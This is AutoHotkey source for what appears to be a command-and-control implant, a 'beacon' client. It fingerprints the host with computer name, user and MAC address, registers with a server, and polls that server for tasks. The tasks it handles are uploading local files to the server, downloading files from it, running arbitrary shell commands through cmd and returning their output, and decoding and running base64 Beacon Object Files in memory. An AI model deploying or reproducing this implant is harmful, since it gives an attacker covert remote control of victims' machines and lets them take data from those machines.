    isRunning := false
    lastAction := ""
    isBusy := false

    loggerIH := ""
    loggerisRunning := false

    __New(serverIP := "127.0.0.1", serverPort := 5074) {
        this.serverIP := serverIP
        this.serverPort := serverPort
        this.Initialize()
        this.computerName := A_ComputerName
        this.agentID := this.GenerateAgentID()

    }

    Log(msg, logFile := "logfile.txt") {
        timestamp := FormatTime(A_Now, "yyyy-MM-dd HH:mm:ss")
        logMessage := timestamp " NetworkClient: " msg "`n"

        try {
            FileAppend(logMessage, "*")
        } catch Error as err {
            FileAppend(logMessage, logFile)
        }
    }

    GenerateAgentID() {
        ; Generate a unique ID based on computer name and other hardware info
        systemInfo := this.GetSystemInfo()
        systemInfo .= A_ScriptFullPath
        return this.HashString(systemInfo)
    }

    GetSystemInfo() {
        ; Collect system information for unique ID generation
        info := A_ComputerName
        info .= A_UserName
        info .= A_OSVersion
        info .= this.GetMACAddress()
        return info
    }

    GetMACAddress() {
        ; Simple MAC address retrieval
        try {
            objWMIService := ComObject("WbemScripting.SWbemLocator").ConnectServer(".", "root\CIMV2")
            colItems := objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
            for objItem in colItems {
                return objItem.MACAddress
            }
        }
        return ""
    }

    HashString(str) {
        ; Simple hashing function
        hash := 0
        loop parse str {
            hash := ((hash << 5) - hash) + Ord(A_LoopField)
            hash := hash & 0xFFFFFFFF
        }
        return Format("{:08x}", hash)
    }

    Initialize() {
        if (!this.wsaInitialized) {
            wsaData := Buffer(408)
            result := DllCall("Ws2_32\WSAStartup", "UShort", 0x0202, "Ptr", wsaData)
            if (result != 0) {
                throw Error("WSAStartup failed with error: " DllCall("Ws2_32\WSAGetLastError"))
            }
            this.wsaInitialized := true
        }
    }

    SendMsg(serverIP, port, message, timeout := 60000, isBinaryResponse := false) {
        maxRetries := 5
        retryCount := 0
        startTime := A_TickCount

        while (A_TickCount - startTime < timeout) {
            try {
                ; Create socket
                this.socket := DllCall("Ws2_32\socket",
                    "Int", this.AF_INET,
                    "Int", this.SOCK_STREAM,
                    "Int", this.IPPROTO_TCP)

                if (this.socket = -1) {
                    throw Error("Socket creation failed: " . DllCall("Ws2_32\WSAGetLastError"))
                }

                ; Set socket options
                timeoutVal := Buffer(4, 0)
                NumPut("UInt", 5000, timeoutVal, 0)  ; 5 second timeout

                DllCall("Ws2_32\setsockopt",
                    "Ptr", this.socket,
                    "Int", 0xFFFF,
                    "Int", 0x1005,
                    "Ptr", timeoutVal,
                    "Int", 4)

                DllCall("Ws2_32\setsockopt",
                    "Ptr", this.socket,
                    "Int", 0xFFFF,
                    "Int", 0x1006,
                    "Ptr", timeoutVal,
                    "Int", 4)

                ; Create sockaddr structure
                sockaddr := Buffer(16, 0)
                NumPut("UShort", this.AF_INET, sockaddr, 0)
                NumPut("UShort", DllCall("Ws2_32\htons", "UShort", port), sockaddr, 2)
                NumPut("UInt", DllCall("Ws2_32\inet_addr", "AStr", serverIP), sockaddr, 4)

                ; Connect
                if (DllCall("Ws2_32\connect",
                    "Ptr", this.socket,
                    "Ptr", sockaddr,
                    "Int", 16) = -1) {
                    wsaError := DllCall("Ws2_32\WSAGetLastError")
                    this.CloseSocket()
                    if (retryCount < maxRetries) {
                        this.Log("Could not connect to server, retrying in 1 second...")
                        Sleep(1000)
                        retryCount++
                        continue
                    }
                    throw Error("Connect failed: " . wsaError)
                }

                ; Send message
                messageBytes := Buffer(StrPut(message, "UTF-8"), 0)
                StrPut(message, messageBytes, "UTF-8")
                bytesSent := DllCall("Ws2_32\send",
                    "Ptr", this.socket,
                    "Ptr", messageBytes,
                    "Int", messageBytes.Size - 1,
                    "Int", 0)

                if (bytesSent = -1) {
                    wsaError := DllCall("Ws2_32\WSAGetLastError")
                    throw Error("Send failed: " . wsaError)
                }

                ; Receive response
                response := Buffer(4096, 0)
                totalReceived := 0

                while (true) {
                    bytesRecv := DllCall("Ws2_32\recv",
                        "Ptr", this.socket,
                        "Ptr", response.Ptr + totalReceived,
                        "Int", response.Size - totalReceived,
                        "Int", 0)

                    if (bytesRecv > 0) {
                        this.Log("Received " . bytesRecv . " bytes")
                        totalReceived += bytesRecv
                        if (totalReceived + 4096 >= response.Size) {
                            ; Expand buffer1
                            newSize := response.Size * 2
                            this.Log("Expanding buffer1 to " . newSize . " bytes")
                            try {
                                newBuffer := Buffer(newSize, 0)
                                DllCall("RtlCopyMemory",
                                    "Ptr", newBuffer,
                                    "Ptr", response,
                                    "UPtr", totalReceived)
                                response := newBuffer
                            } catch as err {
                                this.Log("Buffer expansion failed: " . err.Message)
                                throw err
                            }
                        }
                    } else if (bytesRecv = 0) {
                        this.Log("Server closed connection normally")
                        break
                    } else {
                        wsaError := DllCall("Ws2_32\WSAGetLastError")
                        if (wsaError = this.WSAEWOULDBLOCK) {
                            Sleep(10)
                            continue
                        }
                        throw Error("Receive failed: " . wsaError)
                    }
                }

                ; Return appropriate response format
                if (isBinaryResponse) {
                    if (totalReceived = 0) {
                        return Buffer(0)
                    }
                    finalBuffer := Buffer(totalReceived, 0)
                    DllCall("RtlCopyMemory",
                        "Ptr", finalBuffer,
                        "Ptr", response,
                        "UPtr", totalReceived)
                    return finalBuffer
                } else {
                    return StrGet(response, totalReceived, "UTF-8")
                }

            } catch as err {
                this.Log("SendMsg error: " . err.Message)
                throw err
            } finally {
                this.CloseSocket()
            }
        }
        throw Error("Operation timed out after " . timeout . "ms")
    }

    SetSocketOptions() {
        timeoutVal := Buffer(4, 0)
        NumPut("UInt", 10000, timeoutVal, 0)  ; 10 second timeout

        ; Set receive timeout
        DllCall("Ws2_32\setsockopt",
            "Ptr", this.socket,
            "Int", 0xFFFF,
            "Int", 0x1005,
            "Ptr", timeoutVal,
            "Int", 4)

        ; Set send timeout
        DllCall("Ws2_32\setsockopt",
            "Ptr", this.socket,
            "Int", 0xFFFF,
            "Int", 0x1006,
            "Ptr", timeoutVal,
            "Int", 4)

        ; Set keep-alive
        keepAlive := Buffer(4, 0)
        NumPut("UInt", 1, keepAlive, 0)
        DllCall("Ws2_32\setsockopt",
            "Ptr", this.socket,
            "Int", 0xFFFF,
            "Int", 0x8,
            "Ptr", keepAlive,
            "Int", 4)
    }

    ConnectSocket(serverIP, port) {
        sockaddr := Buffer(16, 0)
        NumPut("UShort", this.AF_INET, sockaddr, 0)
        NumPut("UShort", DllCall("Ws2_32\htons", "UShort", port), sockaddr, 2)
        NumPut("UInt", DllCall("Ws2_32\inet_addr", "AStr", serverIP), sockaddr, 4)

        return DllCall("Ws2_32\connect",
            "Ptr", this.socket,
            "Ptr", sockaddr,
            "Int", 16) != -1
    }

    CloseSocket() {
        if (this.socket) {
            try {
                ; Try to send connection close notification
                DllCall("Ws2_32\shutdown", "Ptr", this.socket, "Int", 1)  ; SD_SEND

                ; Small receive buffer1 to get any pending data
                buffer1 := Buffer(128, 0)

                ; Brief timeout for final receive
                timeoutVal := Buffer(4, 0)
                NumPut("UInt", 100, timeoutVal, 0)  ; 100ms timeout
                DllCall("Ws2_32\setsockopt",
                    "Ptr", this.socket,
                    "Int", 0xFFFF,
                    "Int", 0x1005,
                    "Ptr", timeoutVal,
                    "Int", 4)

                ; Try to receive any remaining data
                while (DllCall("Ws2_32\recv",
                    "Ptr", this.socket,
                    "Ptr", buffer1,
                    "Int", 128,
                    "Int", 0) > 0) {
                    ; Continue receiving until done
                }

                ; Now do full shutdown
                DllCall("Ws2_32\shutdown", "Ptr", this.socket, "Int", 2)  ; SD_BOTH
            } catch {
                ; Ignore errors during cleanup
            }

            ; Always close the socket
            DllCall("Ws2_32\closesocket", "Ptr", this.socket)
            this.socket := 0
        }
    }

    __Delete() {
        this.CloseSocket()
        if (this.wsaInitialized) {
            DllCall("Ws2_32\WSACleanup")
            this.wsaInitialized := false
        }
    }

    Register() {
        this.Log("Attempting to register with server...")
        message := Format("register|{}|{}", this.agentID, this.computerName)

        try {
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            if (InStr(response, "Registration successful")) {
                this.Log("Registration successful")
                return true
            } else {
                this.Log("Registration failed: " response)
                return false
            }
        } catch as err {
            this.Log("Registration error: " err.Message " occurred on line: " err.Line)
            return false
        }
    }

    HandleFileDownload(filename) {
        this.Log("Handling file download: " filename)
        local file := "", verifyFile := ""

        try {
            ; Initial request
            message := Format("to_beacon|{}", filename)
            this.Log("Sending file request: " message)

            ; Send the request and get file data
            response := this.SendMsg(this.serverIP, this.serverPort, message, 60000, true)

            ; Validate response
            if (!response || response.Size = 0) {
                throw Error("No data received from server")
            }

            ; Check for error response
            errorCheck := StrGet(response, 5, "UTF-8")
            if (errorCheck = "ERROR") {
                errorMsg := StrGet(response, response.Size, "UTF-8")
                throw Error("Server error: " errorMsg)
            }

            ; Write file
            try {
                ; Open file in binary write mode
                file := FileOpen(filename, "w-rwd")  ; Binary mode, write access
                if (!file) {
                    throw Error("Could not create file: " filename)
                }

                ; Write data in chunks
                CHUNK_SIZE := 1048576  ; 1MB chunks
                totalWritten := 0

                while (totalWritten < response.Size) {
                    remaining := response.Size - totalWritten
                    writeSize := (remaining > CHUNK_SIZE) ? CHUNK_SIZE : remaining

                    ; Create chunk buffer1
                    chunk := Buffer(writeSize, 0)
                    DllCall("RtlCopyMemory",
                        "Ptr", chunk,
                        "Ptr", response.Ptr + totalWritten,
                        "UPtr", writeSize)

                    ; Write chunk
                    written := file.RawWrite(chunk, writeSize)
                    if (written != writeSize) {
                        throw Error("Write failed: Wrote " . written . " of " . writeSize . " bytes")
                    }

                    totalWritten += written

                    ; Log progress
                    if (totalWritten >= 1048576) {
                        this.Log("Written " . Floor(totalWritten/1048576) . "MB")
                    }
                }

                file.Close()
                file := ""

                ; Verify file size
                verifyFile := FileOpen(filename, "r-r")  ; Read mode
                if (!verifyFile) {
                    throw Error("Could not verify file")
                }

                if (verifyFile.Length != response.Size) {
                    verifyFile.Close()
                    throw Error("File size mismatch: Expected " . response.Size . " got " . verifyFile.Length)
                }

                verifyFile.Close()
                verifyFile := ""

                ; Send single completion notification with shorter timeout
                try {
                    this.SendMsg(this.serverIP, this.serverPort,
                        Format("download_complete|{}|{}", this.agentID, filename),
                        1000)  ; Very short timeout since we don't care about response
                } catch as err {
                    ; If notification fails, log but don't fail the download
                    this.Log("Warning: Could not send completion notification: " err.Message)
                }

                this.Log("File download complete: " filename)
                return true

            } catch as err {
                if (file) {
                    file.Close()
                }
                if (verifyFile) {
                    verifyFile.Close()
                }
                throw Error("File write error: " . err.Message)
            }

        } catch as err {
            this.Log("File download error: " . err.Message)
            ; Send failure notification with shorter timeout
            try {
                this.SendMsg(this.serverIP, this.serverPort,
                    Format("download_failed|{}|{}", this.agentID, filename),
                    5000,  ; 5 second timeout for failure message
                    false)
            } catch {
                ; Ignore errors in failure notification
            }
            return false
        }
    }

    HandleFileUpload(filepath) {
        this.Log("Handling file upload: " filepath)

        try {
            if (!FileExist(filepath)) {
                this.Log("File not found error: " filepath)
                throw Error("File not found: " filepath)
            }

            SplitPath(filepath, &filename)

            ; First send the from_beacon command and wait for READY response
            message := Format("from_beacon|{}", filename)
            this.Log("Sending initial from_beacon command: " message)

            ; Create new socket for file transfer
            transfer_socket := DllCall("Ws2_32\socket",
                "Int", this.AF_INET,
                "Int", this.SOCK_STREAM,
                "Int", this.IPPROTO_TCP)

            if (transfer_socket = -1) {
                this.Log("Failed to create transfer socket")
                throw Error("Socket creation failed")
            }

            try {
                ; Connect socket
                sockaddr := Buffer(16, 0)
                NumPut("UShort", this.AF_INET, sockaddr, 0)
                NumPut("UShort", DllCall("Ws2_32\htons", "UShort", this.serverPort), sockaddr, 2)
                NumPut("UInt", DllCall("Ws2_32\inet_addr", "AStr", this.serverIP), sockaddr, 4)

                if (DllCall("Ws2_32\connect",
                    "Ptr", transfer_socket,
                    "Ptr", sockaddr,
                    "Int", 16) = -1) {
                    throw Error("Connect failed: " DllCall("Ws2_32\WSAGetLastError"))
                }

                ; Send initial command
                messageBytes := Buffer(StrPut(message, "UTF-8"), 0)
                StrPut(message, messageBytes, "UTF-8")

                this.Log("Sending command on transfer socket")
                DllCall("Ws2_32\send",
                    "Ptr", transfer_socket,
                    "Ptr", messageBytes,
                    "Int", messageBytes.Size - 1,
                    "Int", 0)

                ; Wait for READY
                this.Log("Waiting for READY response...")
                ready_buffer := Buffer(128, 0)
                ready_received := DllCall("Ws2_32\recv",
                    "Ptr", transfer_socket,
                    "Ptr", ready_buffer,
                    "Int", 128,
                    "Int", 0)

                if (ready_received <= 0) {
                    throw Error("Failed to receive READY signal")
                }

                ready_response := StrGet(ready_buffer, ready_received, "UTF-8")
                this.Log("Received response: " ready_response)

                if (ready_response != "READY") {
                    throw Error("Unexpected response: " ready_response)
                }

                ; Now send the file
                this.Log("Starting file transfer")
                file := FileOpen(filepath, "r")
                if (!IsObject(file)) {
                    throw Error("Could not open file")
                }

                ; Send file data in chunks
                CHUNK_SIZE := 1048576  ; 1MB chunks
                bytes_sent := 0

                while (!file.AtEOF) {
                    buff := Buffer(CHUNK_SIZE, 0)  ; Create buffer1 for this chunk
                    bytes_read := file.RawRead(buff, CHUNK_SIZE)
                    if (bytes_read = 0) {
                        break
                    }

                    sent := DllCall("Ws2_32\send",
                        "Ptr", transfer_socket,
                        "Ptr", buff.Ptr,
                        "Int", bytes_read,  ; Use actual bytes read
                        "Int", 0)

                    if (sent = -1) {
                        throw Error("Send failed: " DllCall("Ws2_32\WSAGetLastError"))
                    }

                    bytes_sent += sent
                    this.Log("Sent " bytes_sent " bytes")
                }

                file.Close()
                this.Log("File transfer complete. Total bytes sent: " bytes_sent)

                ; Get final response
                this.Log("Waiting for SUCCESS response")
                final_buffer := Buffer(128, 0)
                final_received := DllCall("Ws2_32\recv",
                    "Ptr", transfer_socket,
                    "Int", 128,
                    "Int", 0)

                if (final_received > 0) {
                    final_response := StrGet(final_buffer, final_received, "UTF-8")
                    this.Log("Final response: " final_response)
                    return final_response = "SUCCESS"
                }

                return true

            } finally {
                this.Log("Closing transfer socket")
                DllCall("Ws2_32\closesocket", "Ptr", transfer_socket)
            }

        } catch as err {
            this.Log("File upload error with details: " err.Message " " err.Line)
            return false
        }
    }

    CheckIn() {
        if (this.isBusy) {
            this.Log("Skipping check-in - client is busy")
            return true
        }

        this.isBusy := true
        try {
            this.Log("Checking in with server...")
            message := Format("request_action|{}", this.agentID)

            response := this.SendMsg(this.serverIP, this.serverPort, message)
            if (!response) {
                return false
            }

            responseParts := StrSplit(response, "|")
            action := responseParts[1]
            this.lastAction := action

            result := false
            switch action {
                case "no_pending_commands":
                    this.Log("No pending commands")
                    result := true

                case "download_file":
                    filename := responseParts[2]
                    result := this.HandleFileDownload(filename)

                case "upload_file":
                    filepath := responseParts[2]
                    result := this.HandleFileUpload(filepath)

                case "execute_command":
                    command := responseParts[2]
                    this.Log("CheckIn received execute_command: " command)
                    result := this.HandleCommand(command)

                case "execute_module":
                    module := responseParts[2]
                    if (responseParts.Length >= 3) {
                        parameters := responseParts[3]
                    } else{
                        parameters := ""
                    }

                    this.Log("CheckIn received execute_module " module "|" parameters)
                    result := this.ExecuteModule(module, parameters)

                default:
                    this.Log("Unknown action received: " action)
                    result := false
            }

            return result
        } catch as err {
            this.Log("CheckIn error: " err.Message " " err.Line)
            return false
        } finally {
            this.isBusy := false
        }
    }

    StartCheckInLoop() {
        if (this.isRunning) {
            return
        }

        this.isRunning := true
        SetTimer(ObjBindMethod(this, "CheckIn"), this.checkInInterval)
    }

    StopCheckInLoop() {
        this.isRunning := false
        SetTimer(ObjBindMethod(this, "CheckIn"), 0)
    }

    HandleCommand(command) {

        if command = "shutdown"{
            ExitApp
        }

        this.Log("HandleCommand starting execution of: " command)
        try {
            shell := ComObject("WScript.Shell")
            exec := shell.Exec('%ComSpec% /c ' command)
            output := exec.StdOut.ReadAll()

            if (output){
                message := Format("command_output|{}|{}", this.agentID, output)
            } else {
                message := Format("command_output|{}|(Empty)", this.agentID)
            }
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            return true
        } catch as err {
            this.Log("Command execution failed: " err.Message " occurred on line: " err.Line)
            message := Format("command_output|{}|Exeuction Failed: {}" this.agentID, err.Message)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            return false
        }
    }

    ; ========================================================================
    ; BOF EXECUTION INTEGRATION
    ; ========================================================================

    ExecuteModule(module, parameters) {
        switch module {
            case "bof", "execute_bof":
                return this.ExecuteBOF(parameters)
            default:
                this.Log("Unknown module: " module)
                return false
        }
    }

    ExecuteBOF(parameters) {
        this.Log("Executing BOF with parameters: " parameters)
        BOFLog("========================================", "BEACON")
        BOFLog("       BOF REQUEST RECEIVED", "BEACON")
        BOFLog("========================================", "BEACON")

        try {
            ; parameters format: base64_bof_data|arg1|arg2|...
            parts := StrSplit(parameters, "|")
            bofBase64 := parts[1]

            BOFLog(Format("Base64 BOF data length: {} chars", StrLen(bofBase64)), "BEACON")

            ; Decode BOF from base64
            bofBytes := this.Base64Decode(bofBase64)

            if (!bofBytes || bofBytes.Size = 0) {
                throw Error("Failed to decode BOF data")
            }

            BOFLog(Format("Decoded BOF size: {} bytes", bofBytes.Size), "BEACON")
            this.Log("Decoded BOF: " bofBytes.Size " bytes")

            ; Extract arguments
            args := []
            Loop parts.Length - 1 {
                args.Push(parts[A_Index + 1])
            }

            BOFLog(Format("BOF arguments: {}", args.Length), "BEACON")

            ; Execute BOF
            loader := BOFLoader()
            try {
                output := loader.Execute(bofBytes, args)
                BOFLog("Sending output to server...", "BEACON")
                message := Format("command_output|{}|{}", this.agentID, output)
                this.SendMsg(this.serverIP, this.serverPort, message)
                BOFLog("BOF execution completed successfully", "BEACON")
                return true
            } finally {
                loader.Cleanup()
            }

        } catch as err {
            BOFLog(Format("BOF execution failed: {}", err.Message), "BEACON")
            this.Log("BOF execution failed: " err.Message)
            message := Format("command_output|{}|BOF Error: {}", this.agentID, err.Message)
            this.SendMsg(this.serverIP, this.serverPort, message)
            return false
        }
    }

    Base64Decode(base64String) {
        ; Use CryptStringToBinary for decoding
        ; CRYPT_STRING_BASE64 = 1

        ; First call to get required size
        decodedSize := 0
        DllCall("Crypt32\CryptStringToBinaryW",
            "Str", base64String,
            "UInt", 0,
            "UInt", 1,  ; CRYPT_STRING_BASE64
            "Ptr", 0,
            "UInt*", &decodedSize,
            "Ptr", 0,
            "Ptr", 0)

        if (decodedSize = 0) {
            throw Error("Base64 decode size check failed")
        }

        ; Allocate buffer1 and decode
        decoded := Buffer(decodedSize, 0)
        result := DllCall("Crypt32\CryptStringToBinaryW",
            "Str", base64String,
            "UInt", 0,
            "UInt", 1,  ; CRYPT_STRING_BASE64
            "Ptr", decoded,
            "UInt*", &decodedSize,
            "Ptr", 0,
            "Ptr", 0)

        if (!result) {
            throw Error("Base64 decode failed: " A_LastError)
        }

        return decoded
    }
}

; ============================================================================
; MAIN ENTRY POINT
; ============================================================================

if A_Args.Length = 1 {
    client := NetworkClient(A_Args[1])
}
else If A_Args.Length = 2{
    client := NetworkClient(A_Args[1], A_Args[2])
}
else {
    client := NetworkClient("127.0.0.1", "5074")
}

if (client.Register()) {

    client.StartCheckInLoop()

    while client.isRunning {
        Sleep(100)
    }

} else {
    MsgBox "Registration failed!"
}
